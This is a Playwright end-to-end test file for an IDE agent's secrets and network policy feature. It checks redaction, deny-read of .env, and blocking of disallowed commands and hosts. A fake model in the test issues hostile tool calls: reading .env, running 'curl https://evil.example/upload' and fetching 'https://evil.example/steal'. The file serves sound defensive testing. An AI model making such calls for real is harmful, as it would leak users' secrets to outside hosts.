import { expect, test } from '@playwright/test';
import { toolBlock } from '../src/agent-tools.e2e-utils';
import { pickModel } from '../src/chat.e2e-utils';
import { startFakeOllama, type FakeOllama } from '../src/fake-ollama';
import { ask, auditLines, makeProject, openView, openWithScheme, removeProject, saveShot, SCHEMES } from '../src/ingot-dot.e2e-utils';
import { connectOllama } from '../src/models.e2e-utils';

/** IDEA-325: .ingot/policy.yaml deny-read, redaction, allowed domains and commands, with violations in the Policy view and the audit log. */
const POLICY = `secrets:
  denyRead: [.env, secrets/]
  redact:
    patterns: ["acme_[a-z0-9]{8}"]
    envFiles: true
network:
  allowedDomains: [docs.example.com]
commands:
  allowed: [npm test]
`;
// Made-up values: the test checks they never reach the model.
const ENV_VALUE = 'e2e-payment-token-not-real-42';
const NOTE_TOKEN = 'acme_abcd1234';

test.describe('IDEA-325 secrets and env policy', () => {
    test.setTimeout(150_000);
    let dir = '';
    let server: FakeOllama | undefined;
    test.afterEach(async () => {
        await server?.close();
        server = undefined;
        removeProject(dir);
    });

    for (const scheme of SCHEMES) {
        test(`blocks denied reads, commands and hosts, redacts secrets and records violations (${scheme})`, async ({ page }) => {
            dir = makeProject('ingot-policy-', {
                '.ingot/policy.yaml': POLICY,
                '.env': `PAYMENT_TOKEN=${ENV_VALUE}\n`,
                'secrets/key.txt': 'top secret\n',
                'notes.md': `# Notes\n\nThe staging token is ${NOTE_TOKEN} and PAYMENT_TOKEN is ${ENV_VALUE}.\n`,
                'package.json': '{"name":"shop","private":true,"scripts":{"test":"node -e \\"\\""}}\n'
            });
            const auditBefore = auditLines().length;
            server = await startFakeOllama((_system, user) => {
                if (user.startsWith('Tool result (ingot/read_file)') && user.includes('blocked by policy')) {
                    return toolBlock('read_file', { path: 'notes.md' });
                }
                if (user.startsWith('Tool result (ingot/read_file)')) {
                    return toolBlock('run', { command: 'curl https://evil.example/upload' });
                }
                if (user.startsWith('Tool result (ingot/run)')) {
                    return toolBlock('web_fetch', { url: 'https://evil.example/steal' });
                }
                if (user.startsWith('Tool result (ingot/web_fetch)')) {
                    return 'The policy blocked those.';
                }
                return toolBlock('read_file', { path: '.env' });
            }, { delayMs: 0 });
            await openWithScheme(page, scheme, dir);
            await connectOllama(page, server);
            await page.locator('#ingot-agents-new').click();
            await pickModel(page, 'ollama-local');
            await ask(page, 'look at the env file and notes.md');
            await expect(page.locator('#ingot-agents .ingot-chat-agent').last()).toContainText('The policy blocked those.', { timeout: 60_000 });

            const sent = server.requests.map(r => `${r.system}\n${r.users.join('\n')}`).join('\n');
            expect(sent).not.toContain(ENV_VALUE);
            expect(sent).not.toContain(NOTE_TOKEN);
            expect(sent).toContain('The staging token is [redacted]');
            expect(sent).toContain('Reading .env is denied by secrets.denyRead');
            expect(sent).toContain('commands.allowed');
            expect(sent).toContain('network.allowedDomains');
            expect(server.requests.some(r => r.system.includes('This project has an .ingot/policy.yaml'))).toBe(true);
            await expect(page.locator('#ingot-agents').getByText('blocked by policy. Reading .env is denied').first()).toBeVisible();
            await expect(page.locator('#ingot-approval')).toHaveCount(0);

            const view = page.locator('#ingot-policy');
            await openView(page, 'View: Toggle Policy', view);
            const rules = view.locator('#ingot-policy-violations .ingot-policy-violation');
            await expect(rules).toHaveCount(3);
            await expect(rules.nth(0)).toHaveAttribute('data-rule', 'network.allowedDomains');
            await expect(rules.nth(1)).toHaveAttribute('data-rule', 'commands.allowed');
            await expect(rules.nth(2)).toHaveAttribute('data-rule', 'secrets.denyRead');
            await expect(view.locator('[data-policy-row="Deny read"]')).toHaveText('.env, secrets/');
            await expect(view.locator('#ingot-policy-files [data-file=".ingot/policy.yaml"]')).toBeVisible();

            await expect.poll(() => auditLines().length - auditBefore, { timeout: 15_000 }).toBe(3);
            const recorded = auditLines().slice(auditBefore);
            expect(recorded.every(entry => entry.decision === 'denied' && entry.outcome === 'blocked')).toBe(true);
            expect(recorded.map(entry => entry.tool)).toEqual(['ingot/read_file', 'ingot/run', 'ingot/web_fetch']);
            expect(recorded[0].reason).toContain('secrets.denyRead: .env (.ingot/policy.yaml)');
            expect(JSON.stringify(recorded)).not.toContain(ENV_VALUE);
            await view.locator('#ingot-policy-files [data-file=".ingot/policy.yaml"] .ingot-dot-link').click();
            await expect(page.locator('.theia-editor .monaco-editor').last()).toContainText('denyRead');
            await saveShot(page, 'secrets-policy', scheme);
        });
    }

    test('Create Policy writes the template; denied files stay out of listings', async ({ page }) => {
        dir = makeProject('ingot-policy-new-', { '.env': `PAYMENT_TOKEN=${ENV_VALUE}\n`, 'src/app.ts': 'export const app = 1;\n' });
        await openWithScheme(page, 'light', dir);
        const view = page.locator('#ingot-policy');
        await openView(page, 'View: Toggle Policy', view);
        await expect(view.locator('#ingot-policy-empty')).toBeVisible();
        await view.locator('#ingot-policy-create').click();
        await expect(page.locator('.lm-TabBar-tab.lm-mod-current, .p-TabBar-tab.p-mod-current').filter({ hasText: 'policy.yaml' }).first()).toBeVisible();
        await expect(view.locator('#ingot-policy-files [data-file=".ingot/policy.yaml"]')).toBeVisible();
        await expect(view.locator('[data-policy-row="Deny read"]')).toContainText('.env');

        server = await startFakeOllama((_system, user) => user.startsWith('Tool result (ingot/list_dir)') ? 'Listed.' : toolBlock('list_dir', { path: '.' }), { delayMs: 0 });
        await connectOllama(page, server);
        await page.locator('#ingot-agents-new').click();
        await pickModel(page, 'ollama-local');
        await ask(page, 'what is in the project?');
        await expect(page.locator('#ingot-agents .ingot-chat-agent').last()).toContainText('Listed.', { timeout: 60_000 });
        const listing = server.requests.find(r => r.user.startsWith('Tool result (ingot/list_dir)'))?.user ?? '';
        expect(listing).toContain('src');
        expect(listing).not.toContain('.env');
    });
});
